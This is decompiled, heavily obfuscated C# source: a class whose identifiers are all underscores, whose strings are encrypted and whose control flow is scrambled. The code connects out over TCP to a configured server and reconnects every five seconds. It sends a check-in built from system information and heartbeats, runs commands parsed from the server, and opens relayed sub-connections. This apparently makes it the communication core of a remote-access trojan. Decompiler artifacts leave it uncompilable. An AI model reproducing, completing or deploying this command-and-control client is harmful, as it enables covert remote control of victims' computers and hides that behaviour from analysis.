using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;

public class _________________________________________________________________________________
{
	private delegate void __________________________________________________________________________________(string string_0);

	private System.Threading.Thread __;

	private System.Threading.Thread ___;

	private TcpClient ____;

	private bool _____;

	private _________________________________________________________________________________.__________________________________________________________________________________ ______;

	public System.IO.StreamWriter _______;

	public System.IO.StreamReader ________;

	private string _________;

	public string __________;

	private System.Collections.Generic.List<___________________________________________________________________________________> ___________;

	private event _________________________________________________________________________________.__________________________________________________________________________________ _
	{
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		add
		{
			this.______ = (_________________________________________________________________________________.__________________________________________________________________________________)System.Delegate.Combine(this.______, value);
		}
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		remove
		{
			this.______ = (_________________________________________________________________________________.__________________________________________________________________________________)System.Delegate.Remove(this.______, value);
		}
	}

	static _________________________________________________________________________________()
	{
		// Note: this type is marked as 'beforefieldinit'.
		_________________________________________________________________________________._ = new System.Random();
	}

	public _________________________________________________________________________________()
	{
		this.__ = new System.Threading.Thread(new System.Threading.ThreadStart(this.______________));
		switch (System.Type.EmptyTypes.Length + 0)
		{
		case 0:
			IL_2F:
			this.___ = new System.Threading.Thread(new System.Threading.ThreadStart(this._____________));
			this._____ = false;
			this._________ = <Module>.___<string>(2512997663u);
			this.__________ = <Module>.____<string>(816071137u);
			return;
		}
		goto IL_2F;
	}

	public void ___(byte[] byte_0)
	{
		string expression = this.________________(byte_0);
		string[] array = Strings.Split(expression, this.__________, -1, CompareMethod.Binary);
		string text = array[0];
		try
		{
			if (text.Contains(<Module>.____<string>(4093950867u)))
			{
				Strings.Split(text, <Module>.______<string>(1514956238u), -1, CompareMethod.Binary);
			}
			if (Operators.CompareString(text, <Module>._______<string>(3622075787u), false) == 0)
			{
				System.Collections.Generic.List<___________________________________________________________________________________> obj = this.___________;
				lock (obj)
				{
					this.___________.Add(new ___________________________________________________________________________________(Conversions.ToInteger(array[1]), array[2], System.Convert.ToInt32(array[3]), this));
				}
			}
			string value;
			int arg_171_0;
			if (text.Contains(<Module>.____<string>(3353870568u)))
			{
				value = text.Replace(<Module>.____<string>(3353870568u), string.Empty);
				arg_171_0 = sizeof(int) + -1;
				goto IL_171;
			}
			goto IL_190;
			IL_132:
			byte[] byte_ = (byte[])NewLateBinding.LateIndexGet(this._________________(byte_0, text + <Module>.____<string>(816071137u)), new object[]
			{
				1
			}, null);
			arg_171_0 = System.Type.EmptyTypes.Length + 1;
			IL_171:
			___________________________________________________________________________________ __________________________________________________________________________________2;
			switch (arg_171_0)
			{
			case 0:
			{
				___________________________________________________________________________________ __________________________________________________________________________________;
				if (__________________________________________________________________________________ != null)
				{
					__________________________________________________________________________________.___________();
					goto IL_1B4;
				}
				goto IL_1B4;
			}
			case 1:
				__________________________________________________________________________________2.____________(byte_);
				goto IL_190;
			case 2:
				goto IL_132;
			}
			__________________________________________________________________________________2 = this.______(System.Convert.ToInt32(value));
			if (__________________________________________________________________________________2 != null)
			{
				goto IL_132;
			}
			IL_190:
			if (Operators.CompareString(text, <Module>._____<string>(3056958370u), false) == 0)
			{
				if (sizeof(short) + -13837 != -13835)
				{
					goto IL_132;
				}
				___________________________________________________________________________________ __________________________________________________________________________________ = this.______(System.Convert.ToInt32(array[1]));
				int num;
				arg_171_0 = (((-15 | -(7 * num + 25 * num)) != -15) ? (sizeof(byte) + -1825004396) : (System.Type.EmptyTypes.Length + 0));
				goto IL_171;
			}
			IL_1B4:
			if (text.Contains(<Module>._______<string>(2452482004u)))
			{
				this._________(<Module>._____<string>(3169546967u));
			}
			if (Operators.CompareString(text, <Module>._____<string>(4110971236u), false) == 0)
			{
				this.___________();
			}
		}
		catch (System.Exception expr_1F2)
		{
			ProjectData.SetProjectError(expr_1F2);
			ProjectData.ClearProjectError();
		}
	}

	internal void ____(int int_0)
	{
		try
		{
			this._________(<Module>.___<string>(1531574613u) + this.__________ + int_0.ToString() + this.__________);
		}
		catch (System.Exception expr_2A)
		{
			ProjectData.SetProjectError(expr_2A);
			ProjectData.ClearProjectError();
		}
	}

	internal void _____(int int_0, byte[] byte_0)
	{
		try
		{
			System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
			string text = <Module>._______<string>(387157178u) + int_0.ToString() + this.__________;
			switch (System.Type.EmptyTypes.Length + 0)
			{
			case 0:
				IL_34:
				memoryStream.Write(this._______________(text), 0, text.Length);
				memoryStream.Write(byte_0, 0, byte_0.Length);
				this.__________(memoryStream.ToArray());
				memoryStream.Dispose();
				return;
			}
			goto IL_34;
		}
		catch (System.Exception expr_67)
		{
			ProjectData.SetProjectError(expr_67);
			ProjectData.ClearProjectError();
		}
	}

	public ___________________________________________________________________________________ ______(int int_0)
	{
		System.Collections.Generic.List<___________________________________________________________________________________> obj = this.___________;
		___________________________________________________________________________________ result;
		lock (obj)
		{
			int arg_B8_0 = 24896;
			int arg_20_0 = 2041053184;
			int num = ______________________._______;
			int arg_B8_1;
			if ((arg_20_0 * num & 347209728 * num) != -5411)
			{
				int arg_4F_0 = 182816 + (num << 9);
				int ________________ = <Module>._________________;
				if (arg_4F_0 == ((________________ << 7) + 3036) * 16)
				{
					int num2 = <Module>.___________;
					int num3;
					arg_B8_1 = ((num2 - 4175 != -num2) ? ((~________________ == (int)((uint)(2 * ________________ + 14 * ________________) >> 4)) ? (System.Type.EmptyTypes.Length + 1055786927) : ((3111 + (9896 ^ num3) != num3 - 1346) ? 2003606939 : -1155387096)) : 2132847833);
				}
				else
				{
					arg_B8_1 = 24895;
				}
			}
			else
			{
				arg_B8_1 = -1218952436;
			}
			int i;
			if (arg_B8_0 != arg_B8_1)
			{
				int arg_CA_0 = 0;
				int num4 = this.___________.Count - 1;
				for (i = arg_CA_0; i <= num4; i++)
				{
					if (this.___________[i]._ == int_0)
					{
						goto IL_F1;
					}
				}
				result = null;
				return result;
			}
			IL_F1:
			result = this.___________[i];
		}
		return result;
	}

	public void _______(int int_0)
	{
		try
		{
			System.Collections.Generic.List<___________________________________________________________________________________> obj = this.___________;
			lock (obj)
			{
				int arg_1F_0 = 0;
				int num = this.___________.Count - 1;
				int i = arg_1F_0;
				switch (sizeof(System.Guid) + -16)
				{
				}
				while (i <= num)
				{
					if (this.___________[i]._ == int_0)
					{
						this.___________.RemoveAt(i);
						break;
					}
					i++;
				}
			}
		}
		catch (System.Exception arg_6D_0)
		{
			ProjectData.SetProjectError(arg_6D_0);
			ProjectData.ClearProjectError();
		}
	}

	internal void ________(int int_0, bool bool_0, long long_0, int int_1, string string_0)
	{
		int arg_53_0 = sizeof(int) + 23735;
		int arg_53_1 = 21866;
		int ________________ = <Module>._________________;
		string text = <Module>.__________(arg_53_0, arg_53_1, ((________________ & 1572864) != (int)(1572864u & (uint)(1223 * ________________ + 825 * ________________) >> 11)) ? (sizeof(uint) + 449967039) : (System.Type.EmptyTypes.Length + 69));
		try
		{
			IPHostEntry hostEntry = Dns.GetHostEntry(string_0);
			if (hostEntry != null && !string.IsNullOrEmpty(hostEntry.HostName))
			{
				text = hostEntry.HostName;
			}
		}
		catch (System.Exception expr_7E)
		{
			ProjectData.SetProjectError(expr_7E);
			int arg_99_0 = 7680;
			int ______________ = <Module>._______________;
			text = <Module>.__________(((arg_99_0 & ______________ % 334) != 0) ? (System.Type.EmptyTypes.Length + -1106452178) : 67078, System.Type.EmptyTypes.Length + 66756, (((______________ ^ (int)((uint)(______________ * 112 + ______________ * 912) >> 10)) & 1950272) != 0) ? (System.Type.EmptyTypes.Length + 769464470) : 213);
			ProjectData.ClearProjectError();
		}
		try
		{
			if ((12 * ________________ + 52 * ________________ | -62) != -62)
			{
				goto IL_1F6;
			}
			System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
			string[] array = new string[12];
			array[0] = <Module>.______<string>(3848050600u);
			int num;
			int arg_221_0 = ((2021654527 | (num / 16147 + 3664) / 1755) != 2021654527) ? (System.Type.EmptyTypes.Length + -1836766512) : (System.Type.EmptyTypes.Length + 2);
			while (true)
			{
				IL_221:
				switch (arg_221_0)
				{
				case 0:
					array[3] = this.__________;
					array[4] = text;
					if (num != -17210)
					{
						goto IL_19D;
					}
					goto IL_1F6;
				case 1:
					goto IL_19D;
				case 3:
					goto IL_23B;
				}
				array[1] = this.__________;
				array[2] = Conversions.ToString(int_0);
				num = System.Type.EmptyTypes.Length + -17210;
				arg_221_0 = sizeof(int) + -4;
				continue;
				IL_19D:
				array[7] = this.__________;
				array[8] = long_0.ToString();
				if (num != -9818)
				{
				}
				array[9] = this.__________;
				array[10] = int_1.ToString();
				arg_221_0 = System.Type.EmptyTypes.Length + 3;
			}
			IL_23B:
			array[11] = this.__________;
			string text2 = string.Concat(array);
			memoryStream.Write(this._______________(text2), 0, text2.Length);
			this.__________(memoryStream.ToArray());
			memoryStream.Dispose();
			return;
			IL_1F6:
			array[5] = this.__________;
			array[6] = bool_0.ToString();
			num = System.Type.EmptyTypes.Length + -551;
			arg_221_0 = System.Type.EmptyTypes.Length + 1;
			goto IL_221;
		}
		catch (System.Exception expr_279)
		{
			ProjectData.SetProjectError(expr_279);
			ProjectData.ClearProjectError();
		}
	}

	public void _________(string string_0)
	{
		try
		{
			System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
			string text = string_0 + this.__________;
			memoryStream.Write(this._______________(text), 0, text.Length);
			this.__________(memoryStream.ToArray());
			memoryStream.Dispose();
		}
		catch (System.Exception expr_3B)
		{
			ProjectData.SetProjectError(expr_3B);
			ProjectData.ClearProjectError();
		}
	}

	public void __________(byte[] byte_0)
	{
		try
		{
			System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
			memoryStream.Write(byte_0, 0, byte_0.Length);
			memoryStream.Write(this._______________(this._________), 0, this._________.Length);
			this.____.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (System.Exception expr_51)
		{
			ProjectData.SetProjectError(expr_51);
			ProjectData.ClearProjectError();
		}
	}

	public void ___________()
	{
		int num;
		int num3;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_07:
			int num2 = 2;
			string arg_24_0 = <Module>.___<string>(982404538u);
			string arg_24_1 = <Module>.____<string>(3976132824u);
			<Module>._______________ = num3;
			______________________________________________________________.______________(arg_24_0, arg_24_1);
			if (sizeof(System.Guid) + 23911 == -12364)
			{
				goto IL_B0;
			}
			IL_3C:
			num2 = 3;
			System.Threading.Thread.Sleep(250);
			IL_49:
			num2 = 4;
			______________________________________________._ = false;
			int arg_6C_0 = 1969644439;
			int num4 = <Module>.___________;
			if ((arg_6C_0 & num4 / 11744510 - -741126588) != 0)
			{
			}
			IL_70:
			num2 = 5;
			this.__.Abort();
			IL_7E:
			num2 = 6;
			switch (sizeof(double) + -7)
			{
			case 0:
				goto IL_B0;
			case 1:
				IL_97:
				this.___.Abort();
				IL_A2:
				num2 = 7;
				this.____.Close();
				goto IL_B0;
			}
			goto IL_97;
			IL_B0:
			num2 = 8;
			this._______.Close();
			IL_BE:
			num2 = 9;
			this.________.Close();
			IL_CD:
			num2 = 10;
			System.Threading.Thread.CurrentThread.Abort();
			IL_DB:
			goto IL_157;
			IL_DD:
			int arg_E2_0 = num3 + 1;
			num3 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_E2_0);
			IL_117:
			goto IL_14C;
			num3 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_12A:
			goto IL_14C;
		}
		object arg_12C_0;
		endfilter(arg_12C_0 is System.Exception & num != 0 & num3 == 0);
		IL_14C:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_157:
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void ____________()
	{
		try
		{
			string string_;
			while (true)
			{
				IL_219:
				while (!______________________________________________._)
				{
					______________________________________________________________.______________(<Module>._____<string>(1464211711u), <Module>._______<string>(2890662388u));
					int arg_2B_0 = -536870912;
					int num = <Module>.___________;
					int num2 = (((uint)(arg_2B_0 * num) >> 14 & 32768u) == (uint)(32768 & num << 15)) ? 22576 : (System.Type.EmptyTypes.Length + 957365921);
					int arg_1FB_0 = sizeof(ushort) + 1;
					while (true)
					{
						string[] array;
						int num3;
						switch (arg_1FB_0)
						{
						case 0:
							goto IL_D4;
						case 1:
							array[5] = _________________________________________________________________.________();
							array[6] = <Module>._______<string>(1974200954u);
							if (((1939 * num3 + num3 * 109 ^ (int)((uint)(3206 & num) >> 5)) & 768) != 0)
							{
								int _______________ = <Module>.________________;
								arg_1FB_0 = 1207027330;
								continue;
							}
							arg_1FB_0 = 4;
							continue;
						case 2:
						{
							this.____.ReceiveBufferSize = 9999999;
							this.____.SendBufferSize = 9999999;
							int _______________;
							num2 = ((_______________ - 2669 != (int)((uint)(-356515840 * _______________) >> 22)) ? (sizeof(short) + 9735) : (System.Type.EmptyTypes.Length + 2103540714));
							arg_1FB_0 = System.Type.EmptyTypes.Length + 0;
							continue;
						}
						case 3:
							goto IL_AE;
						case 4:
							break;
						default:
							goto IL_AE;
						}
						IL_63:
						string_ = string.Concat(array);
						this.____ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
						arg_1FB_0 = ((10 * (num * 7 + num) + (num * 7 + num) * 6 == -6477) ? (System.Type.EmptyTypes.Length + 316223022) : 2);
						continue;
						IL_D4:
						System.Threading.Thread.Sleep(5000);
						if (this.____.Client.Connected)
						{
							goto IL_23F;
						}
						if (num2 != -15373)
						{
							break;
						}
						goto IL_63;
						IL_AE:
						array = new string[7];
						array[0] = <Module>.___<string>(1189505955u);
						num3 = num2;
						num2 = 32615;
						if (num3 != 22576)
						{
							goto IL_D4;
						}
						array[1] = ______________________________________________________________.________________________;
						array[2] = <Module>.____<string>(3008796200u);
						if (num2 == 31115)
						{
							goto IL_219;
						}
						array[3] = _________________________________________________________________._________();
						array[4] = <Module>.______<string>(861631917u);
						arg_1FB_0 = ((num2 / 61016 == 2074733548) ? -685781150 : (System.Type.EmptyTypes.Length + 1));
					}
					this.____.Close();
					System.Threading.Thread.Sleep(5000);
				}
				goto IL_270;
			}
			IL_23F:
			this.__________________(string_);
			this.___________ = new System.Collections.Generic.List<___________________________________________________________________________________>();
			______________________________________________._ = true;
			this.__.Start();
			this.___.Start();
			return;
			IL_270:
			______________________________________________________________.______________(<Module>.______<string>(2043928306u), <Module>._______<string>(1611523509u));
		}
		catch (System.Exception expr_28B)
		{
			ProjectData.SetProjectError(expr_28B);
			System.Exception ex = expr_28B;
			______________________________________________________________.______________(<Module>._____<string>(2571642080u), <Module>._______<string>(2159248989u) + ex.ToString());
			this.___________();
			ProjectData.ClearProjectError();
		}
	}

	public void _____________()
	{
		int num;
		int num3;
		try
		{
			IL_00:
			int ________________ = <Module>._________________;
			if ((________________ * -1711276032 ^ 1056551) != 0)
			{
				ProjectData.ClearProjectError();
				num = 1;
				goto IL_57;
			}
			IL_49:
			int num2 = 9;
			System.Threading.Thread.Sleep(5000);
			IL_57:
			num2 = 3;
			IL_21:
			num2 = 4;
			this._________(<Module>.___<string>(3184663097u));
			IL_34:
			num2 = 5;
			if (this.____.Client.Connected)
			{
				goto IL_49;
			}
			IL_5C:
			num2 = 6;
			this.___________();
			IL_65:
			IL_67:
			goto IL_E3;
			IL_69:
			int arg_6E_0 = num3 + 1;
			num3 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_6E_0);
			IL_A3:
			goto IL_D8;
			num3 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_B6:
			goto IL_D8;
		}
		object arg_B8_0;
		endfilter(arg_B8_0 is System.Exception & num != 0 & num3 == 0);
		IL_D8:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_E3:
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void ______________()
	{
		System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
		while (true)
		{
			try
			{
				int arg_21_0 = 1476395008;
				int ____________ = <Module>._____________;
				if (arg_21_0 + (____________ << 22 ^ 6956) == ____________ * 4194304)
				{
					goto IL_4E;
				}
				goto IL_2A3;
				System.Array array;
				int num;
				while (true)
				{
					IL_27E:
					int arg_27E_0;
					byte[] array2;
					switch (arg_27E_0)
					{
					case 0:
						memoryStream.Dispose();
						memoryStream = new System.IO.MemoryStream();
						if (array.Length != 2)
						{
							goto IL_2AF;
						}
						if (num != 32485)
						{
							goto IL_1A4;
						}
						goto IL_213;
					case 1:
					{
						Socket arg_196_0 = this.____.Client;
						byte[] arg_196_1 = array2;
						int arg_196_2 = 0;
						int arg_196_3 = array2.Length;
						<Module>.______________ = -759738571;
						arg_196_0.Receive(arg_196_1, arg_196_2, arg_196_3, SocketFlags.None);
						if (num != 3465)
						{
							goto IL_1A4;
						}
						break;
					}
					case 3:
						goto IL_4E;
					}
					array2 = new byte[this.____.Available - 1 + 1];
					num = (((8585 & (-1848300863 & num) * 1024) == 0) ? (sizeof(ushort) + -14840) : (System.Type.EmptyTypes.Length + 1367378952));
					arg_27E_0 = System.Type.EmptyTypes.Length + 1;
					continue;
					IL_1A4:
					memoryStream.Write(array2, 0, array2.Length);
					int num2 = <Module>.__________;
					arg_27E_0 = (((num2 * 14 + 50 * num2 - 3143 ^ 7564) != 0) ? (sizeof(byte) + 2) : (System.Type.EmptyTypes.Length + -2125108053));
				}
				IL_213:
				memoryStream.Write((byte[])NewLateBinding.LateIndexGet(array, new object[]
				{
					1
				}, null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet(array, new object[]
				{
					1
				}, null), null, <Module>._______<string>(4255277695u), new object[0], null, null, null)));
				System.Threading.Thread.Sleep(1);
				IL_4E:
				if (!this.________________(memoryStream.ToArray()).Contains(<Module>._____<string>(1355333096u)))
				{
					goto IL_2AF;
				}
				array = this._________________(memoryStream.ToArray(), <Module>.___<string>(2512997663u));
				num = 29033;
				int num3 = ______________________._______;
				if (~((num3 << 5) - 8579) != 2 * (num3 * 4 + 4 * num3))
				{
					this.___((byte[])NewLateBinding.LateIndexGet(array, new object[]
					{
						0
					}, null));
					num = System.Type.EmptyTypes.Length + 32485;
					int num4;
					int arg_27E_0 = ((-(-5732 & num) & 3) == 0) ? 0 : (((num4 % 2 & -7686) == 0) ? (System.Type.EmptyTypes.Length + 1765411812) : (System.Type.EmptyTypes.Length + -1854557672));
					goto IL_27E;
				}
				IL_2A3:
				if (!______________________________________________._)
				{
					this.___________();
				}
				if (this.____.Available > 0)
				{
					int arg_27E_0 = System.Type.EmptyTypes.Length + 2;
					goto IL_27E;
				}
				IL_2AF:
				System.Threading.Thread.Sleep(10);
			}
			catch (System.Exception expr_2B8)
			{
				ProjectData.SetProjectError(expr_2B8);
				ProjectData.ClearProjectError();
				break;
			}
		}
	}

	public byte[] _______________(string string_0)
	{
		return System.Text.Encoding.Default.GetBytes(string_0);
	}

	public string ________________(byte[] byte_0)
	{
		return System.Text.Encoding.Default.GetString(byte_0);
	}

	public System.Array _________________(byte[] byte_0, string string_0)
	{
		System.Collections.Generic.List<byte[]> list = new System.Collections.Generic.List<byte[]>();
		System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
		System.IO.MemoryStream memoryStream2 = new System.IO.MemoryStream();
		string[] array = Strings.Split(this.________________(byte_0), string_0, -1, CompareMethod.Binary);
		int num = ______________________._______;
		int arg_E0_0;
		if (((uint)num >> 25) + 18178048u != (uint)(num % 168693468) >> 17)
		{
			arg_E0_0 = System.Type.EmptyTypes.Length + 0;
		}
		else
		{
			int arg_5C_0 = 925;
			int ________________ = <Module>._________________;
			arg_E0_0 = (((-(arg_5C_0 | ________________) & 537) == 1) ? (sizeof(System.Guid) + 280464842) : 1843118327);
		}
		while (true)
		{
			switch (arg_E0_0)
			{
			case 1:
				goto IL_EF;
			}
			memoryStream.Write(byte_0, 0, array[0].Length);
			int num2;
			if ((-3747 ^ 1996488704 * num2) == 0)
			{
				int arg_B2_0 = -2113888181;
				int ________________2 = <Module>._________________;
				arg_E0_0 = (((arg_B2_0 + ________________2 / 1445 | 2147483647) != -1) ? (System.Type.EmptyTypes.Length + 877233698) : (sizeof(long) + -1901552341));
			}
			else
			{
				arg_E0_0 = System.Type.EmptyTypes.Length + 1;
			}
		}
		IL_EF:
		System.IO.MemoryStream arg_11A_0 = memoryStream2;
		int arg_11A_2 = array[0].Length + string_0.Length;
		int arg_11A_3 = byte_0.Length - (array[0].Length + string_0.Length);
		System.Array array2;
		<Module>._____ = array2;
		arg_11A_0.Write(byte_0, arg_11A_2, arg_11A_3);
		list.Add(memoryStream.ToArray());
		list.Add(memoryStream2.ToArray());
		memoryStream.Dispose();
		memoryStream2.Dispose();
		return list.ToArray();
	}

	public void __________________(string string_0)
	{
		try
		{
			this._______ = new System.IO.StreamWriter(this.____.GetStream());
			this._______.WriteLine(<Module>._______<string>(1020359086u) + string_0);
			this._______.Flush();
		}
		catch (System.Exception expr_3E)
		{
			ProjectData.SetProjectError(expr_3E);
			this.___________();
			ProjectData.ClearProjectError();
		}
	}
}
